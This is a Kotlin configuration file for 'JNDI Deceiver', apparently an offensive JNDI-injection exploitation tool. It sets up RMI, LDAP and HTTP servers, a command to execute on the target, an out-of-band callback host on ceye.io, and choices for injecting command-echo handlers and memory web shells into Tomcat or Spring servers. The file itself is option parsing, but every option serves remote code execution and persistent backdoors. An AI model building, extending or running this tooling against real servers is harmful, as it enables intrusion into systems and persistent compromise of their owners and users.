package util

import kotlinx.cli.ArgParser
import kotlinx.cli.ArgType
import kotlinx.cli.default
import java.net.Inet4Address
import java.net.InetAddress
import java.net.NetworkInterface

object Option {
    // static options
    const val collabAddress = "http://foo.ceye.io/"
    const val payloadName = "Payload"
    const val javaVersion = 8

    // cli options
    private val parser = ArgParser("JNDI Deceiver")
    val command by parser
        .option(ArgType.String, shortName = "c", description = "command you want to exec")
        .default("open /System/Applications/Calculator.app")
    val address by parser
        .option(ArgType.String, shortName = "a", description = "ip or hostname of this server")
        .default(getDefaultAddr())
    val rmiPort by parser
        .option(ArgType.Int, shortName = "rp", description = "port of RMI server")
        .default(1099)
    val ldapPort by parser
        .option(ArgType.Int, shortName = "lp", description = "port of LDAP server")
        .default(1389)
    val httpPort by parser
        .option(ArgType.Int, shortName = "hp", description = "port of HTTP server")
        .default(8180)
    val echo by parser
        .option(ArgType.Choice(listOf("tomcat", "spring", "http"), { it }), description = "type of echo")
    val memshell by parser
        .option(ArgType.Choice(listOf("tomcat", "spring"), { it }), description = "type of memory shell")
    val helpInfo by parser
        .option(ArgType.Boolean, shortName = "hh", description = "Detailed info")
        .default(false)

    fun init(args: Array<String>) {
        parser.parse(args)
    }

    /**
     * 获取本地网卡的第一个 IP 作为默认地址
     */
    private fun getDefaultAddr(): String {
        val netInterfaces = NetworkInterface.getNetworkInterfaces()
        while (netInterfaces.hasMoreElements()) {
            val elem = netInterfaces.nextElement()
            if (elem.isLoopback || !elem.isUp) continue

            elem.interfaceAddresses.forEach {
                val addr = it.address
                if (addr is Inet4Address) return addr.hostAddress
            }
        }
        return InetAddress.getLocalHost().hostAddress
    }
}
